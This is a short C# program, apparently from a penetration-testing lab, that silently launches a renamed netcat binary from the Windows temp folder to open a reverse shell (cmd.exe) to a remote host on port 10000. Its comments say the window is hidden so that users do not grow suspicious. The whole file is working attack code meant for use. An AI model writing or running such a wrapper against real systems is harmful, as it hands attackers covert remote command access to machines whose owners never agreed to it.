// Importing basic modules which will help us start system processes using System;
using System.Diagnostics;

namespace Wrapper{ class Program{ static void Main()

   {
     
     //Creating an Process class object which is imported from System module
      Process proc = new Process();
      //Creating process info telling it instruction on what to do when started in system memory
      ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-ghoul.exe", "10.50.49.x 10000 -e cmd.exe");
     
     
     //restrictig service to create a gui which may make users suspicious thats why disabling it
      procInfo.CreateNoWindow = true;
      //starting the proces
      proc.StartInfo = procInfo;
      proc.Start();

                           
    }
}

}
